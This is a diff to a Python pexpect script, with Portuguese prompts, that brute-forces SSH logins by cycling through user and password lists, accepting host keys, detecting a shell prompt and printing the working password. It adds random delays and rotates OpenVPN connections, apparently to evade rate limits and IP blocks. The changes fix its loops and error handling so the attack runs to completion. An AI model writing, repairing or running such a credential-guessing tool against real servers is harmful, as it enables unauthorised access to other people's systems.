@@ -24,7 +24,12 @@ TIMEOUT = "timeout"
 
 def expect_state(process, states):
     patterns = [pattern for _, pattern in states]
-    result = process.expect(patterns)
+    try:
+        result = process.expect(patterns)
+    except pexpect.EOF:
+        return END
+    except pexpect.TIMEOUT:
+        return TIMEOUT
     return states[result][0]
 
 i = int(input("Qual o valor inicial do usuário: "))
@@ -38,7 +43,7 @@ next5 = 5
 
 tries_exceeded = 0
 
-while i < len(len(usersl)):
+while i < len(usersl):
     
     with open("/tmp/status", "r") as f:
         lines = f.readlines()
@@ -48,7 +53,7 @@ while i < len(len(usersl)):
     with open("/tmp/status", "w") as f:
         f.writelines(lines)
 
-    while j < len(len(passwordsl)):
+    while j < len(passwordsl):
 
         with open("/tmp/status", "r") as f:
             lines = f.readlines()
@@ -65,20 +70,9 @@ while i < len(len(usersl)):
             timeout=10,
         )
 
-        result = expect_state(process, [
-            (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
-            (FIRST_PASSWORD, r"\(.*\) Password:"),
-            (PASSWORD, r".+'s password:"),
-            (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
-            (DENIED, r"Permission denied"),
-            (END, pexpect.EOF),
-            (TIMEOUT, pexpect.TIMEOUT),
-        ])
-
-        if result == KEY_CONFIRMATION:
-            print("Aceitando a chave do servidor...")
-            process.sendline("yes")
+        try:
             result = expect_state(process, [
+                (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
                 (FIRST_PASSWORD, r"\(.*\) Password:"),
                 (PASSWORD, r".+'s password:"),
                 (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
@@ -87,19 +81,36 @@ while i < len(len(usersl)):
                 (TIMEOUT, pexpect.TIMEOUT),
             ])
 
-        while result in (FIRST_PASSWORD, PASSWORD):
-            process.sendline(str(passwordsl[j]))
-            result = expect_state(process, [
-                (PASSWORD, r".+'s password:"),
-                (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
-                (DENIED, r"Permission denied"),
-                (END, pexpect.EOF),
-                (TIMEOUT, pexpect.TIMEOUT),
-            ])
+            if result == KEY_CONFIRMATION:
+                print("Aceitando a chave do servidor...")
+                process.sendline("yes")
+                result = expect_state(process, [
+                    (FIRST_PASSWORD, r"\(.*\) Password:"),
+                    (PASSWORD, r".+'s password:"),
+                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                    (DENIED, r"Permission denied"),
+                    (END, pexpect.EOF),
+                    (TIMEOUT, pexpect.TIMEOUT),
+                ])
+
+            while result in (FIRST_PASSWORD, PASSWORD):
+                process.sendline(str(passwordsl[j]))
+                result = expect_state(process, [
+                    (PASSWORD, r".+'s password:"),
+                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                    (DENIED, r"Permission denied"),
+                    (END, pexpect.EOF),
+                    (TIMEOUT, pexpect.TIMEOUT),
+                ])
+        except pexpect.EOF:
+            result = END
+        except pexpect.TIMEOUT:
+            result = TIMEOUT
 
         if result == SHELL:
             password = passwordsl[j]
             print(password)
+            process.close()
 
             finded = True
 
@@ -127,17 +138,19 @@ while i < len(len(usersl)):
         delay = random.randint(1, 3)
         time.sleep(delay)
 
-        if result in (DENIED, END, TIMEOUT):
+        if result in (END, TIMEOUT):
             tries_exceeded += 1
 
             if tries_exceeded >= 15:
                 print("Muitas tentativas falhadas. Encerrando...")
+                process.close()
                 break
 
             process.close()
             continue
 
         tries_exceeded = 0
+        process.close()
         
         if j >= next5:
             openvpn_enter.close()
@@ -146,9 +159,13 @@ while i < len(len(usersl)):
 
         j += 1
 
-    i += 1
-
     if tries_exceeded >= 15:
         break
+
+    if finded == True:
+        break
+
+    i += 1
+    j = 0
 
 openvpn_enter.close()
